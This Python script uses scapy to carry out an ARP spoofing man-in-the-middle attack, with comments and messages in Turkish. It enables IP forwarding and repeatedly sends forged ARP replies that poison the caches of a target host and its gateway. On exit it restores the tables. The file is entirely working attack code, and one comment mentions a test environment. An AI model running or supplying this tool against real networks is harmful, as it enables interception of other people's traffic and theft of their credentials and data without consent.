import scapy.all as scapy
import time
import sys
import os

def set_ip_forwarding(value):
    """
    Linux çekirdeğinde IP yönlendirmeyi açar (1) veya kapatır (0).
    Bu sayede terminalden manuel komut girmeye gerek kalmaz.
    """
    ipv4_path = "/proc/sys/net/ipv4/ip_forward"
    try:
        with open(ipv4_path, "w") as f:
            f.write(str(value))
        status = "AÇILDI" if value == 1 else "KAPATILDI"
        print(f"[*] IP Forwarding {status}.")
    except Exception as e:
        print(f"[!] IP Forwarding ayarlanamadı: {e}")
        print("[!] Lütfen scripti 'sudo' ile çalıştırdığından emin ol.")
        sys.exit()

def get_mac(ip):
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast/arp_request
    answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]
    
    if answered_list:
        return answered_list[0][1].hwsrc
    return None

def spoof(target_ip, spoof_ip):
    target_mac = get_mac(target_ip)
    if not target_mac:
        return
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    scapy.send(packet, verbose=False)

def restore(dest_ip, source_ip):
    dest_mac = get_mac(dest_ip)
    source_mac = get_mac(source_ip)
    if dest_mac and source_mac:
        packet = scapy.ARP(op=2, pdst=dest_ip, hwdst=dest_mac, psrc=source_ip, hwsrc=source_mac)
        scapy.send(packet, count=4, verbose=False)

# --- AYARLAR ---
# NOT: Bu IP'leri kendi test ortamına göre düzenle
target_ip = "192.168.1.25"  
gateway_ip = "192.168.1.1"   

# --- ANA PROGRAM ---
if __name__ == "__main__":
    # 1. Başlarken IP Yönlendirmeyi OTOMATİK Aç
    set_ip_forwarding(1)

    try:
        packet_count = 0
        print(f"[*] Saldırı Başlıyor: {target_ip} <--> {gateway_ip}")
        while True:
            spoof(target_ip, gateway_ip)
            spoof(gateway_ip, target_ip)
            packet_count += 2
            print(f"\r[+] Zehirli paket yollandı: {packet_count}", end="")
            time.sleep(2)

    except KeyboardInterrupt:
        print("\n[!] İşlem durduruluyor... Ağ eski haline getiriliyor.")
        restore(target_ip, gateway_ip)
        restore(gateway_ip, target_ip)
        
        # 2. Çıkarken IP Yönlendirmeyi OTOMATİK Kapat (Sistemi temiz bırak)
        set_ip_forwarding(0)
        print("[*] Bitti.")